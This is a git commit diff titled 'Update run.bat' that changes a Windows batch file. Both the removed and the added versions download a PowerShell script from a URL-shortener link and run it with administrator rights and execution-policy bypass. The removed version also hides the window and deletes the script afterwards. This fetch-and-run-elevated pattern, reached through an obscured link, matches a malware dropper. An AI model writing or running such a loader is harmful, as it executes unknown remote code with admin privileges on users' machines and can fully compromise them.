9a45bf795e1422b17f9a7e4b4b701b7209aaccf0
Drae <bwakang1212@gmail.com>
2025-09-14 22:50:18 +0800

    Update run.bat

--- run.bat
+++ run.bat
@@ -1,1 +1,10 @@
-powershell -NoProfile -WindowStyle Hidden -Command "iwr 'https://is.gd/WY2tr9' -OutFile $env:TEMP\sort.ps1; Start-Process powershell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -File $env:TEMP\sort.ps1' -Verb RunAs -WindowStyle Hidden -Wait; Remove-Item $env:TEMP\sort.ps1"
+@echo off
+set "RAWURL=https://is.gd/sortps1"
+powershell -NoProfile -Command ^
+  "Try {
+      Invoke-WebRequest -Uri '%RAWURL%' -OutFile '%~dp0sqd5.ps1' -UseBasicParsing -ErrorAction Stop;
+      Start-Process powershell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -File \"%~dp0sqd5.ps1\"' -Verb RunAs
+  } Catch {
+      Write-Error 'Download failed';
+      Exit 1
+  }"
